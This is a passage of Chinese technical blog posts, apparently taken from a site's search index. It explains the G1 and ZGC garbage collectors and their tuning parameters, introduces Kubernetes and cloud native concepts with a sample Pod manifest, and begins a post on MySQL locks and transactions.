\n工程实现中，读写屏障还有其他功能，比如写屏障可以用于记录跨代&#x2F;区引用的变化，读屏障可以用于支持移动对象的并发执行等。功能之外，还有性能的考虑，所以对于选择哪种，每款垃圾回收器都有自己的想法。\nG1收集器G1收集器是一款面对服务器的垃圾收集器，主要正对配备多克处理器及大容量内存的机器，以极高概率满足GC停顿时间要求的同时，具备高吞吐量性能特征。\n\nG1将Java堆划分为多个大小相等的独立区域（Region），JVM最多可以有2048个Region。 \n一般Region大小等于堆大小除以2048，比如堆大小为4096M，则Region大小为2M，当然也可以用参数”-XX:G1HeapRegionSize“手动指定Region大小，但是推荐默认的计算方式。 \nG1保留了年轻代和老年代的概念，但不再是物理隔阂了，它们都是（可以不连续）Region的集合。 \n【注意是逻辑上分代，而不是物理上分代了\n默认年轻代对堆内存的占比是5%，如果堆大小为4096M，那么年轻代占据200MB左右的内存，对应大概是100个Region，可以通过“-XX:G1NewSizePercent”设置新生代初始占比，在系统运行中，JVM会不停的给年轻代增加更多的Region，但是最多新生代的占比不会超过60%，可以通过“-XX:G1MaxNewSizePercent”调整。年轻代中的Eden和Survivor对应的region也跟之前一样，默认8:1:1，假设年轻代现在有1000个region，eden区对应800个，s0对应100个，s1对应100个。 \n一个Region可能之前是年轻代，如果Region进行了垃圾回收，之后可能又会变成老年代，也就是说Region的区域功能可能会动态变化。 \nG1垃圾收集器对于对象什么时候会转移到老年代跟之前讲过的原则一样，唯一不同的是对大对象的处理，G1有专门分配大对象的Region叫Humongous区，而不是让大对象直接进入老年代的Region中。\n在G1中，大对象的判定规则就是一个大对象超过了一个Region大小的50%，比如按照上面算的，每个Region是2M，只要一个大对象超过了1M，就会被放入Humongous中，而且一个大对象如果太大，可能会横跨多个Region来存放。 \nHumongous区专门存放短期巨型对象，不用直接进老年代，可以节约老年代的空间，避免因为老年代空间不够的GC开销。\nFull GC的时候除了收集年轻代和老年代之外，也会将Humongous区一并回收。 \nG1收集器的特点G1收集器在后台维护了一个优先列表，每次根据允许的收集时间，优先选择回收价值最大的Region(这也就是它的名字Garbage-First的由来)。比如一个Region花200ms能回收10M垃圾，另外一个Region花50ms能回收20M垃圾，在回收时间有限情况下，G1当然会优先选择后面这个Region回收。这种使用Region划分内存空间以及有优先级的区域回收方式，保证了G1收集器在有限时间内可以尽可能高的收集效率。\nG1收集器被视为JDK1.7以上版本Java虚拟机的一个重要进化特征。它具备以下特点:\n\n并行与并发：G1能充分利用CPU、多核环境下的硬件优势，使用多个CPU来缩短STW停顿时间。相比之下，部分其他收集器原本需要停顿Java线程来执行GC动作，G1收集器仍然可以通过并发的方式让java程序继续执行。\n分代收集: 虽然G1可以不需要其他收集器配合就能独立管理整个GC堆，但是还是保留了分代的概念。\n空间整合:与CMS的标记清理算法不同，G1从整体来看是基于标记压缩算法实现的收集器是，从局部上来看是基于标志复制算法实现的。\n可预测的停顿: 这是G1相对于CMS的另一个大优势， 降低停顿时间是G1和CMS共同的关注点，但G1除了追求低停顿外，还能建立可预测的停顿时间模型，能让使用者明确指定在一个时间片段(通过参数 -XX:MaxGCPauseMillis 指定)内完成垃圾收集。\n\nG1中的三种GCYoung GC\nYoung GC并不是说现有的Eden区放满了就会马上触发，G1会计算下现在Eden区回收大概要多久时间，如果回收时间远远小于参数 XX:MaxGCPauseMills 设定的值，那么增加年轻代的Region，继续给新对像存放，不会马上做Young GC。直到下一次Eden区放满，G1计算回收时间接近参数 XX:MaxGCPauseMills 设定的值，那么就会触发Young GC。\nMixed GC\nMixed GC是G1中特有的GC方式，它不是Full GC。老年代的堆占有率达到参数-XX:InitiatingHeapOccupancyPercent设定的值则触发，回收所有的年轻代和部分老年代(根据期望的GC停顿时间确定old区垃圾收集的优先顺序)以及大对象区，正常情况G1的垃圾收集是先做MixedGC，主要使用复制算法，需要把各个Region中存活的对象拷贝到别的Region里去，拷贝过程中如果发现没有足够的空Region能够承载拷贝对象就会触发一次Full GC。\nFull GC\n停止系统程序，然后采用单线程（在Shanandoah垃圾收集器中实现了多线程）进行标记、清理和压缩整理，好空闲出来一批Region来供下一 次Mixed GC使用， 这个过程是非常耗时的。\nG1垃圾收集流程Mixed GC收集的步骤和CMS收集器垃圾回收步骤相似，如下图所示：\n\n\n初始标记：暂停所有的其他线程(STW)，并记录下gc roots直接能引用的对象，速度很快\n\n并发标记：同CMS的并发标记(无STW)\n\n最终标记：同CMS的重新标记(STW)\n\n筛选回收：筛选回收阶段首先对各个Region的回收价值和成本进行排序，根据用户所期望的GC停顿时间(XX:MaxGCPauseMillis 指定)来制定回收计划。\n 比如说老年代此时有1000个Region都满了，但是因为根据预期停顿时间，本次垃圾回收可能只能停顿200ms，那么通过之前回收成本计算得知，可能回收其中800个Region刚好需要200ms，那么就只会回收800个Region，是为了尽量把GC导致的停顿时间控制在我们指定的范围内。\n这个阶段其实也可以做到与用户程序起并发执行(在Shanandoah垃圾收集器中实现了并发)， 但是因为只回收部分Region，时间是用户可控制的，而且停顿用户线程将大幅提高收集效率。\n不管是年轻代或是老年代，回收算法主要用的是标记复制算法，将一个Region中的存活对象复制到另一个Region中，这种不会像CMS那样回收完由于存在很多内存碎片还需要进行整理。\n\n\n\nG1收集器参数设置 \n-XX:+UseG1GC:使用G1收集器 \n-XX:ParallelGCThreads:指定GC工作的线程数量 \n-XX:G1HeapRegionSize:指定分区大小(1MB~32MB，且必须是2的N次幂)，默认将整堆划分为2048个分区 \n-XX:MaxGCPauseMillis:目标暂停时间(默认200ms) \n-XX:G1NewSizePercent:新生代内存初始空间(默认整堆5%) \n-XX:G1MaxNewSizePercent:新生代内存最大空间 \n-XX:TargetSurvivorRatio:Survivor区的填充容量(默认50%)，Survivor区域里的一批对象(年龄1+年龄2+年龄n的多个年龄对象)总和超过了Survivor区域的50%，此时就会把年龄n(含)以上的对象都放入老年代 \n-XX:MaxTenuringThreshold:最大年龄阈值(默认15) \n-XX:InitiatingHeapOccupancyPercent:老年代占用空间达到整堆内存阈值(默认45%)，则执行新生代和老年代的混合收集(MixedGC)，比如我们之前说的堆默认有2048个region，如果有接近1000个region都是老年代的region，则可能就要触发MixedGC了 \n-XX:G1MixedGCLiveThresholdPercent(默认85%) region中的存活对象低于这个值时才会回收该region，如果超过这个值，存活对象过多，回收的的意义不大。 \n-XX:G1MixedGCCountTarget:在一次回收过程中指定做几次筛选回收(默认8次)，在最后一个筛选回收阶段可以回收一会，然后暂停回收，恢复系统运行，一会再开始回收，这样可以让系统不至于单次停顿时间过长。 \n-XX:G1HeapWastePercent(默认5%): gc过程中空出来的region是否充足阈值，在混合回收的时候，对Region回收都是基于复制算法进行的，都是把要回收的Region里的存活对象放入其他Region，然后这个Region中的垃圾对象全部清理掉，这样的话在回收过程就会不断空出来新的Region，一旦空闲出来的Region数量达到了堆内存的5%，此时就会立即停止混合回收，意味着本次混合回收就结束了。\n\nG1垃圾收集器优化建议假设参数 -XX:MaxGCPauseMills 设置的值很大，导致系统运行很久，年轻代可能都占用了堆内存的60%了，此时才 \n触发年轻代gc。 \n那么存活下来的对象可能就会很多，此时就会导致Survivor区域放不下那么多的对象，就会进入老年代中。 \n或者是你年轻代gc过后，存活下来的对象过多，导致进入Survivor区域后触发了动态年龄判定规则，达到了Survivor \n区域的50%，也会快速导致一些对象进入老年代中。所以这里核心还是在于调节 -XX:MaxGCPauseMills 这个参数的值，在保证他的年轻代gc别太频繁的同时，还得考虑 \n每次gc过后的存活对象有多少,避免存活对象太多快速进入老年代，频繁触发mixed gc. \n记忆集与卡表在新生代做GC Roots可达性扫描过程中可能会碰到跨代引用的对象，这种如果又去对老年代再去扫描效率太低了。为此，在新生代可以引入记忆集（Remember Set）的数据结构来记录从非收集区到收集区的指针集合，避免把整个老年代加入GC Roots扫描范围。事实上并不只是新生代、 老年代之间才有跨代引用的问题， 所有涉及部分区域收集（Partial GC）行为的垃圾收集器， 典型的如G1、 ZGC和Shenandoah收集器， 都会面临相同的问题。\n垃圾收集场景中，收集器只需通过记忆集判断出某一块非收集区域是否存在指向收集区域的指针即可，无需了解跨代引用指针的全部细节。Hotspot使用一种叫做**卡表(Card Table)**的方式实现记忆集，也是目前最常用的一种方式。关于卡表与记忆集的关系，可以类比为Java语言中HashMap与Map的关系。\n卡表是使用一个字节数组实现：CARD_TABLE[ ]，每个元素对应着其标识的内存区域一块特定大小的内存块，称为**卡页(Card Page)**。HotSpot使用的卡页大小是2^9，即512字节。如下图所示：\n\n一个卡页中可包含多个对象，只要有一个对象的字段存在跨代指针，其对应的卡表的元素标识就变成1，表示该元素变脏，否则为0。\nGC时，只要筛选本收集区的卡表中变脏的元素加入GC Roots里。但是如何让卡表变脏，即发生引用字段赋值时，如何更新卡表对应的标识为1？Hotspot使用写屏障维护卡表状态。当老年代对象引用年轻代对象时，通过写屏障修改年轻代中的对应卡表。\n什么场景适合使用G150%以上的堆被存活对象占用 \n对象分配和晋升的速度变化非常大 \n垃圾回收时间特别长，超过1秒 \n8GB以上的堆内存(建议值) \n停顿时间是500ms以内 \nZGC垃圾收集器简介ZGC是一款JDK 11中新加入的具有实验性质的低延迟垃圾收集器，ZGC可以说源自于是Azul System公司开发的C4（Concurrent Continuously Compacting Collector）收集器。\n参考文章：\n\nhttps://wiki.openjdk.java.net/display/zgc/Main\nhttp://cr.openjdk.java.net/~pliden/slides/ZGC-Jfokus-2018.pdf\n\nZGC的目标主要有以下四个：\n\n\n支持TB量级的堆：我们生产环境的硬盘还没有上TB，这应该可以满足未来十年内，所有JAVA应用的需求了。\n最大GC停顿时间不超10ms：目前一般线上环境运行良好的JAVA应用Minor GC停顿时间在10ms左右，而Old GC一般都需要100ms以上（G1垃圾收集器可以调节停顿时间，但是如果调的过低的话，反而会适得其反），ZGC垃圾收集器之所以能做到这一点是因为它的停顿时间主要跟GC Roots扫描有关，而GC Roots数量和堆大小是没有任何关系的。\n奠定未来GC特性的基础。\n**最糟糕的情况下吞吐量会降低15%**：这都不是事，停顿时间足够优秀。至于吞吐量，通过扩容就可以解决。\n\n另外，Oracle官方提到了它最大的优点是：它的停顿时间不会随着堆的增大而增长！也就是说，几十G堆的停顿时间是10ms以下，几百G甚至上T堆的停顿时间也是10ms以下。\n未实现分代ZGC垃圾收集器暂时没有实现分代。我们知道以前的垃圾回收器之所以分代，是因为对象的声明周期都不一致，一些是朝生夕死的，而另一些是长期存活的，因此通过对堆内存的分代可以更方便地对对象进行分代管理。那么为什么ZGC就不分代呢？因为分代实现起来麻烦，作者就先实现出一个比较简单可用的单代版本，后续会优化。\n内存分布ZGC收集器是一款基于Region内存布局的(与G1收集器相似)，暂时不设分代的， 使用了读屏障、 颜色指针等技术来实现可并发的标记整理算法的， 以低延迟为首要目标的一款垃圾收集器。ZGC的Region可以具有大、 中、 小三类容量：\n\n小型Region（Small Region） ：容量固定为2MB， 用于放置小于256KB的小对象。\n中型Region（Medium Region） ：容量固定为32MB， 用于放置大于等于256KB但小于4MB的对象。\n大型Region（Large Region）：容量不固定， 可以动态变化， 但必须为2MB的整数倍， 用于放置4MB或以上的大对象。 每个大型Region中只会存放一个大对象， 但它的实际容量完全有可能小于中型Region， 最小容量可低至4MB。 大型Region在ZGC的实现中是不会被重分配（重分配是ZGC的一种处理动作，用于复制对象的收集器阶段， 稍后会介绍到）的， 因为复制一个大对象的代价非常高昂。\n\n\nNUMA-awareNUMA对应的有UMA，UMA即Uniform Memory Access Architecture，NUMA就是Non Uniform Memory Access Architecture。\nUMA表示内存只有一块，所有CPU都去访问这一块内存，那么就会存在竞争问题（争夺内存总线访问权），有竞争就会有锁，有锁效率就会受到影响，而且CPU核心数越多，竞争就越激烈。\n而NUMA每个CPU对应有一块内存，且这块内存在主板上离这个CPU是最近的，每个CPU优先访问这块内存，那效率自然就提高了：【实际上就是各个CPU有自己的所属地\n\n服务器的NUMA架构在中大型系统上一直非常盛行，也是高性能的解决方案，尤其在系统延迟方面表现都很优秀。ZGC是能自动感知NUMA架构并充分利用NUMA架构特性的。\n颜色指针颜色指针，即Colored Pointers，是ZGC的核心设计之一。以前的垃圾回收器的GC信息保存在对象头或独立的数据结构中，而ZGC的GC信息保存在指针中。如果将GC相关信息保存在对象头中会有什么问题？我们说垃圾收集器其实并不关注对象本身的信息，而仅仅关注它的引用，比如我们所说的三色标记其实和对象本身并没有关系，本质上只和对象的引用有关。如果将GC信息记录在对象头上，而对象发生了移动，我们可能就无法成功访问了，这样就需要耗费额外的成本去维护。而ZGC垃圾收集器直接将对象的GC信息记录在了对象指针上，如下图所示(64位机器)：\n\n每个对象有一个64位指针，这64位被分为：\n\n18位：预留给以后使用\n1位：Finalizable标识，此位与并发引用处理有关，它表示这个对象只能通过finalize()方法才能访问\n1位：Remapped标识，标识是否进入了重分配集（需要被回收Region的集合），即是否被移动过\n1位：Marked1标识，用于标识指针的三色状态，辅助GC\n1位：Marked0标识，和上面的Marked1作用相同\n42位：对象的地址（所以它可以支持2^42&#x3D;4T内存）\n\n通过对配置ZGC后对象指针分析我们可知，对象指针必须是64位，那么ZGC就无法支持32位操作系统。同样的也就无法支持指针压缩了（CompressedOops，压缩指针将64位指针压缩成32位）。那么颜色指针有什么优势?\n\n一旦某个Region的存活对象被移走之后，这个Region立即就能够被释放和重用掉，而不必等待整个堆中所有指向该Region的引用都被修正后才能清理，这使得理论上只要还有一个空闲Region，ZGC就能完成收集。\n颜色指针可以大幅减少在垃圾收集过程中内存屏障的使用数量，ZGC只使用了读屏障。\n颜色指针具备强大的扩展性，它可以作为一种可扩展的存储结构用来记录更多与对象标记、重定位过程相关的数据，以便日后进一步提高性能。\n\n读屏障之前的GC都是采用Write Barrier，即写屏障。这次ZGC采用了完全不同的方案读屏障，这个是ZGC一个非常重要的特性。在标记和移动对象的阶段，每次从堆里对象的引用类型中读取一个指针的时候，都需要加上一个Load Barriers。\n那么我们该如何理解它呢？看下面的代码，第一行代码我们尝试读取堆中的一个对象引用obj.fieldA并赋给引用o（fieldA也是一个对象时才会加上读屏障）。如果这时候对象在GC时被移动了，接下来JVM就会加上一个读屏障，这个读屏障会把读出的指针更新到对象的新地址上，并且把堆里的这个指针修正到原本的字段里。这样就算GC把对象移动了，读屏障也会发现并修正指针，于是应用代码就永远都会持有更新后的有效指针，而且不需要STW。那么，JVM是如何判断对象被移动过呢？就是利用上面提到的颜色指针中的四位，如果指针是Bad Color，那么程序还不能往下执行，需要先修正指针；如果指针是Good Color，那么正常往下执行即可：\n\n后面3行代码都不需要加读屏障：Object p = o这行代码并没有从堆中读取数据；o.doSomething()也没有从堆中读取数据；obj.fieldB不是对象引用，而是原子类型。正是因为Load Barriers的存在，所以会导致配置ZGC的应用的吞吐量会变低。官方的测试数据是需要多出额外4%的开销。\nZGC执行流程ZGC的运作过程大致可划分为以下四个大的阶段：\n\n\n并发标记（Concurrent Mark）：与G1一样，并发标记是遍历对象图做可达性分析的阶段，它的初始标记 (Mark Start 相当于G1的初始标记) 和最终标记 (Mark End) 也会出现短暂的停顿，与G1不同的是， ZGC的标记是在指针上而不是在对象上进行的， 标记阶段会更新染色指针中的Marked 0、 Marked1标志位。\n\n并发预备重分配（Concurrent Prepare for Relocate）：这个阶段需要根据特定的查询条件统计得出本次收集过程要清理哪些Region，将这些Region组成重分配集（Relocation Set）。ZGC每次回收都会扫描所有的Region，用范围更大的扫描成本换取省去G1中记忆集的维护成本。\n\n并发重分配（Concurrent Relocate）：重分配是ZGC执行过程中的核心阶段，这个过程要把重分配集中的存活对象复制到新的Region上，并为重分配集中的每个Region维护一个转发表（Forwardding Table），记录从旧对象到新对象的转向关系。\nZGC收集器能仅从引用上就明确得知一个对象是否处于重分配集之中，如果用户线程此时并发访问了位于重分配集中的对象，这次访问将会被预置的内存屏障(读屏障)所截获，然后立即根据Region上的转发表记录将访问转发到新复制的对象上，并同时修正更新该引用的值，使其直接指向新对象，ZGC将这种行为称为指针的自愈（Self-Healing）能力。\n\n\n\nZGC的颜色指针因为自愈（Self‐Healing）能力，所以只有第一次访问旧对象会变慢， 一旦重分配集中某个Region的存活对象都复制完毕后，这个Region就可以立即释放用于新对象的分配，但是转发表还得留着不能释放掉， 因为可能还有访问在使用这个转发表。\n\n\n并发重映射（Concurrent Remap）：重映射所做的就是修正整个堆中指向重分配集中旧对象的所有引用，但是ZGC中对象引用存在自愈功能，所以这个重映射操作并不是很迫切。ZGC很巧妙地把并发重映射阶段要做的工作，合并到了下一次垃圾收集循环中的并发标记阶段里去完成，反正它们都是要遍历所有对象的，这样合并就节省了一次遍历对象图的开销。一旦所有指针都被修正之后， 原来记录新旧对象关系的转发表就可以释放掉了。\n\n我在官网中选取了几张关键的ZGC垃圾收集流程图，帮助大家理解：\n\nZGC存在的问题ZGC最大的问题是浮动垃圾。ZGC的停顿时间是在10ms以下，但是ZGC的执行时间还是远远大于这个时间的。假如ZGC全过程需要执行10分钟，在这个期间由于对象分配速率很高，将创建大量的新对象，这些对象很难进入当次GC，所以只能在下次GC的时候进行回收，这些只能等到下次GC才能回收的对象就是浮动垃圾。\n这也是ZGC没有分代所导致的问题，每次都需要进行全堆扫描，导致一些朝生夕死的对象没能及时的被回收。 那么如何解决？\n目前唯一的办法是增大堆的容量，使得程序得到更多的喘息时间，但是这个也是一个治标不治本的方案。如果需要从根本上解决这个问题，还是需要引入分代收集，让新生对象都在一个专门的区域中创建，然后专门针对这个区域进行更频繁、更快的收集。\nZGC参数设置启用ZGC比较简单，设置JVM参数-XX:+UnlockExperimentalVMOptions和-XX:+UseZGC即可。调优也并不难，因为ZGC调优参数并不多，远不像CMS那么复杂。它和G1一样，可以调优的参数都比较少，大部分工作JVM能很好的自动完成。下图所示是ZGC可以调优的参数：\n\nZGC触发时机ZGC目前有4种机制触发GC：\n\n定时触发：默认为不使用，可通过-XX:ZCollectionInterval参数配置。\n预热触发：最多三次，在堆内存达到10%、20%、30%时触发，主要用来统计GC时间，为其他GC机制使用。 当垃圾回收次数大于三次时，预热规则不再生效。\n根据分配速率触发：基于正态分布统计，计算内存99.9%可能的最大分配速率，以及此速率下内存将要耗尽的时间点，在耗尽之前触发GC。\n主动触发：通过参数-XX:ZProactive参数配置，默认开启。距上次GC堆内存增长10%，或距上次GC的时间超过5分钟时，对比距上次GC的间隔时间 &gt; 49 * 一次GC的最大持续时间，若大于则触发。\n\n","tags":["2021"]},{"title":"Kubernetes","url":"/2021/11/12/2021/Kubernetes/","content":"\n\n云计算介绍云计算包含的内容十分繁杂，也有很多技术和公司牵强附会说自己是云计算公司，说自己是做云的，实际上可能风马牛不相及。说白了，云计算就是一种配置资源的方式，根据资源配置方式的不同我们可以把云计算从宏观上分为以下三种类型：\n\nIaaS：这是为了想要建立自己的商业模式并进行自定义的客户，例如亚马逊的EC2、S3存储、Rackspace虚拟机等都是IaaS。\nPaaS：工具和服务的集合，对于想用它来构建自己的应用程序或者想快速得将应用程序部署到生产环境而不必关心底层硬件的用户和开发者来说是特别有用的，比如Cloud Foundry、Google App Engine、Heroku等。\nSaaS：终端用户可以直接使用的应用程序。这个就太多，我们生活中用到的很多软件都是SaaS服务，只要基于互联网来提供的服务基本都是SaaS服务，有的服务是免费的，比如Google Docs，还有更多的是根据我们购买的Plan和使用量付费，比如GitHub、各种云存储。\n\n云原生概念介绍下面是Cloud Native概念思维导图\n\n云原生准确来说是一种文化，更是一种潮流，它是云计算的一个必然导向。它的意义在于让云成为云化战略成功的基石，而不是阻碍，如果业务应用上云之后开发和运维人员比原先还痛苦，成本还高的话，这样的云我们宁愿不上。\n自从云的概念开始普及，许多公司都部署了实施云化的策略，纷纷搭建起云平台，希望完成传统应用到云端的迁移。但是这个过程中会遇到一些技术难题，上云以后，效率并没有变得更高，故障也没有迅速定位。\n为了解决传统应用升级缓慢、架构臃肿、不能快速迭代、故障不能快速定位、问题无法快速解决等问题，云原生这一概念横空出世。云原生可以改进应用开发的效率，改变企业的组织结构，甚至会在文化层面上直接影响一个公司的决策。\n另外，云原生也很好地解释了云上运行的应用应该具备什么样的架构特性——敏捷性、可扩展性、故障可恢复性。\n从宏观概念上讲，云原生是不同思想的集合，集目前各种热门技术之大成，具体包括如下图所示的几个部分。\nKubernetes与云原生的关系Kuberentes可以说是乘着Docker和微服务的东风，一经推出便迅速蹿红，它的很多设计思想都契合了微服务和云原生应用的设计法则，这其中最著名的就是开发了Heroku PaaS平台的工程师们总结的 Twelve-factor App了。\nKubernetes介绍Kubernetes是Google基于Borg开源的容器编排调度引擎，作为CNCF（Cloud Native Computing Foundation）最重要的组件之一，它的目标不仅仅是一个编排系统，而是提供一个规范，可以让你来描述集群的架构，定义服务的最终状态，Kubernetes可以帮你将系统自动得达到和维持在这个状态。\n更直白的说，Kubernetes用户可以通过编写一个yaml或者json格式的配置文件，也可以通过工具&#x2F;代码生成或直接请求Kubernetes API创建应用，该配置文件中包含了用户想要应用程序保持的状态，不论整个Kubernetes集群中的个别主机发生什么问题，都不会影响应用程序的状态，你还可以通过改变该配置文件或请求Kubernetes API来改变应用程序的状态。\n服务发现与负载均衡Kubernetes在设计之初就充分考虑了针对容器的服务发现与负载均衡机制，提供了Service资源，并通过kube-proxy配合cloud provider来适应不同的应用场景。随着Kubernetes用户的激增，用户场景的不断丰富，又产生了一些新的负载均衡机制。目前，Kubernetes中的负载均衡大致可以分为以下几种机制，每种机制都有其特定的应用场景：\n\nService：直接用Service提供cluster内部的负载均衡，并借助cloud provider提供的LB提供外部访问\nIngress：还是用Service提供cluster内部的负载均衡，但是通过自定义LB提供外部访问\nService Load Balancer：把load balancer直接跑在容器中，实现Bare Metal的Service Load Balancer\nCustom Load Balancer：自定义负载均衡，并替代kube-proxy，一般在物理部署Kubernetes时使用，方便接入公司已有的外部服务\n\n详见Kubernetes Handbook - 服务发现与负载均衡。\n持续集成与发布\n使用Jenkins进行持续集成与发布流程图\n应用构建和发布流程说明：\n\n用户向Gitlab提交代码，代码中必须包含Dockerfile\n将代码提交到远程仓库\n用户在发布应用时需要填写git仓库地址和分支、服务类型、服务名称、资源数量、实例个数，确定后触发Jenkins自动构建\nJenkins的CI流水线自动编译代码并打包成Docker镜像推送到Harbor镜像仓库\nJenkins的CI流水线中包括了自定义脚本，根据我们已准备好的Kubernetes的YAML模板，将其中的变量替换成用户输入的选项\n生成应用的Kubernetes YAML配置文件\n更新Ingress的配置，根据新部署的应用的名称，在Ingress的配置文件中增加一条路由信息\n更新PowerDNS，向其中插入一条DNS记录，IP地址是边缘节点的IP地址。关于边缘节点，请查看边缘节点配置\nJenkins调用Kubernetes的API，部署应用\n\n日志收集与监控基于现有的ELK日志收集方案，稍作改造，选用filebeat来收集日志，可以作为sidecar的形式跟应用运行在同一个Pod中，比较轻量级消耗资源比较少。\n\n图 2.4.7：filebeat日志收集架构图\n详见Kubernetes Handbook - 应用日志收集。\n如何开发Kubernetes原生应用步骤介绍当我们有了一个kubernetes集群后，如何在上面开发和部署应用，应该遵循怎样的流程？\n下面我将展示如何使用go语言开发和部署一个Kubernetes native应用，使用wercker进行持续集成与持续发布，我将以一个很简单的前后端访问，获取伪造数据并展示的例子来说明。\n云原生应用开发示例我们将按照如下步骤来开发部署一个Kubernetes原生应用并将它部署到Kubernetes集群上开放给集群外访问：\n\n服务API的定义\n使用Go语言开发Kubernetes原生应用\n一个持续构建与发布工具与环境\n使用traefik和VIP做边缘节点提供外部访问路由\n\n\nKubernetes简介最初源于谷歌内部的 Borg，提供了面向应用的容器集群部署和管理系统。Kubernetes 的目标旨在消除编排物理 &#x2F; 虚拟计算，网络和存储基础设施的负担，并使应用程序运营商和开发人员完全将重点放在以容器为中心的原语上进行自助运营。Kubernetes 也提供稳定、兼容的基础（平台），用于构建定制化的 workflows 和更高级的自动化任务。 Kubernetes 具备完善的集群管理能力，包括多层次的安全防护和准入机制、多租户应用支撑能力、透明的服务注册和服务发现机制、内建负载均衡器、故障发现和自我修复能力、服务滚动升级和在线扩容、可扩展的资源自动调度机制、多粒度的资源配额管理能力。Kubernetes 还提供完善的管理工具，涵盖开发、部署测试、运维监控等各个环节。\n\n架构集群集群是一组节点，这些节点可以是物理服务器或者虚拟机，在他上面安装了Kubernetes环境。\n\nMaster 负责管理集群, master 协调集群中的所有活动，例如调度应用程序、维护应用程序的所需状态、扩展应用程序和滚动更新。 \n节点是 Kubernetes 集群中的工作机器，可以是物理机或虚拟机。每个工作节点都有一个 kubelet，它是管理节点并与 Kubernetes Master 节点进行通信的代理。节点上还应具有处理容器操作的容器运行时，例如 Docker 或 rkt。一个 Kubernetes 工作集群至少有三个节点。 Master 管理集群，而节点用于托管正在运行的应用程序。\n当您在 Kubernetes 上部署应用程序时，您可以告诉 master 启动应用程序容器。Master 调度容器在集群的节点上运行。 \n节点使用 Master 公开的 Kubernetes API 与 Master 通信。用户也可以直接使用 Kubernetes 的 API 与集群交互。\nPodPod 是一组紧密关联的容器集合，它们共享 PID、IPC、Network 和 UTS namespace，是Kubernetes 调度的基本单位。\nPod 的设计理念是支持多个容器在一个 Pod 中共享网络和文件系统，可以通过进程间通信和文件共享这种简单高效的方式组合完成服务。 在 Kubernetes 中，所有对象都使用 manifest（yaml或json）来定义，比如一个简单的 nginx 服务可以定义为 nginx.yaml，它包含一个镜像为 nginx 的容器：\napiVersion: v1kind: Podmetadata:    name: nginx    labels:        app: nginxspec:    containers:    - name: nginx        image: nginx        ports:        - containerPort: 80\n\nLabelLabel 是识别 Kubernetes 对象的标签，以 key&#x2F;value 的方式附加到对象上（key最长不能超过63字节，value 可以为空，也可以是不超过253字节的字符串）。\nLabel 不提供唯一性，并且实际上经常是很多对象（如Pods）都使用相同的 label 来标志具体的应用。 Label 定义好后其他对象可以使用 Label Selector 来选择一组相同 label 的对象（比如Service 用 label 来选择一组 Pod）。Label Selector支持以下几种方式：\n\n等式，如app&#x3D;nginx和env!&#x3D;production\n集合，如env in (production, qa)\n多个label（它们之间是AND关系），如app&#x3D;nginx,env&#x3D;test\n\nNamespaceNamespace 是对一组资源和对象的抽象集合，比如可以用来将系统内部的对象划分为不同的项目组或用户组。常见的 pods, services,deployments 等都是属于某一个 namespace 的（默认是default），而 Node, PersistentVolumes 等则不属于任何 namespace。\nDeploymentDeployment 确保任意时间都有指定数量的 Pod“副本”在运行。如果为某个 Pod 创建了Deployment 并且指定3个副本，它会创建3个 Pod，并且持续监控它们。如果某个 Pod 不响应，那么 Deployment 会替换它，保持总数为3.\n如果之前不响应的 Pod 恢复了，现在就有4个 Pod 了，那么 Deployment 会将其中一个终止保持总数为3。如果在运行中将副本总数改为5，Deployment 会立刻启动2个新 Pod，保证总数为5。Deployment 还支持回滚和滚动升级。\n当创建 Deployment 时，需要指定两个东西：\n\nPod模板：用来创建 Pod 副本的模板\nLabel标签：Deployment 需要监控的 Pod 的标签。\n\n现在已经创建了 Pod 的一些副本，那么在这些副本上如何均衡负载呢？我们需要的是 Service。\nServiceService 是应用服务的抽象，通过 labels 为应用提供负载均衡和服务发现。\n匹配 labels 的Pod IP 和端口列表组成 endpoints，由 kube-proxy 负责将服务 IP 负载均衡到这些endpoints 上。\n每个 Service 都会自动分配一个 cluster IP（仅在集群内部可访问的虚拟地址）和 DNS 名，其他容器可以通过该地址或 DNS 来访问服务，而不需要了解后端容器的运行。 \n\nDocker 的一些常用方法，当然我们的重点会在 Kubernetes 上面\n会用 kubeadm 来搭建一套 Kubernetes 的集群\n理解 Kubernetes 集群的运行原理\n常用的一些控制器使用方法\n还有 Kubernetes 的一些调度策略\nKubernetes的运维\n包管理工具 Helm 的使用\n最后我们会实现基于 Kubernetes 的 CI&#x2F;CD\n\n","tags":["2021"]},{"title":"MySql锁与事务","url":"/2021/04/05/2021/MySql%E9%94%81%E4%B8%8E%E4%BA%8B%E5%8A%A1/","content":"\n\n锁定义锁是计算机协调多个进程或线程并发访问某一资源的机制。 在数据库中，除了传统的计算资源（如CPU、RAM、I&#x2F;O等）的争用以外， 数据也是一种供需要用户共享的资源。如何保证数据并发访问的一致性、有效性 是所有数据库必须解决的一个问题，锁冲突也是影响数据库并发访问性能的一个 重要因素。\n锁分类\n性能上分为乐观锁（使用版本对比控制实现）和悲观锁\n数据库操作上分为读锁和写锁（悲观锁）\n从对数据操作的粒度上分为表锁和行锁\n\n表锁每次操作锁住整张表。开销小，加锁快；不会出现死锁；锁定粒度大，发生锁冲突的概率最高，并发度最低；\n手动增加表锁\nlock table 表名称 read(write),表名称2 read(write)\n查看表上加过的锁 \nshow open tables; \n删除表锁 \nunlock tables; \nMyISAM在执行查询语句(SELECT)前,会自动给涉及的所有表加读锁,在执行增删改 操作前,会自动给涉及的表加写锁。 \n1、对MyISAM表的读操作(加读锁) ,不会阻寒其他进程对同一表的读请求,但会阻 赛对同一表的写请求。只有当读锁释放后,才会执行其它进程的写操作。 \n2、对MylSAM表的写操作(加写锁) ,会阻塞其他进程对同一表的读和写操作,只有 当写锁释放后,才会执行其它进程的读写操作 \n总结： \n简而言之，就是读锁会阻塞写，但是不会阻塞读。而写锁则会把读和写都阻塞。\n行锁InnoDB与MYISAM的最大不同有两点：\n\n支持事务\n支持行级锁\n\n事务事务是由一组SQL语句组成的逻辑处理单元,事务具有以下4个属性,通常简称为事务的ACID属性。 \n原子性(Atomicity) ：事务是一个原子操作单元,其对数据的修改,要么全都执行,要么全都不执行。 \n一致性(Consistent) ：在事务开始和完成时,数据都必须保持一致状态。这意味着所有相关的数据规则都必须应用于事务的修改,以保持数据的完整性;事务结束时,所有的内部数据结构(如B树索引或双向链表)也都必须是正确的。 \n隔离性(Isolation) ：数据库系统提供一定的隔离机制,保证事务在不受外部并发操作影响的“独立”环境执行。这意味着事务处理过程中的中间状态对外部是不可见的,反之亦然。 \n持久性(Durable) ：事务完成之后,它对于数据的修改是永久性的,即使出现系统故障也能够保持\n带来的问题更新丢失（Lost Update） 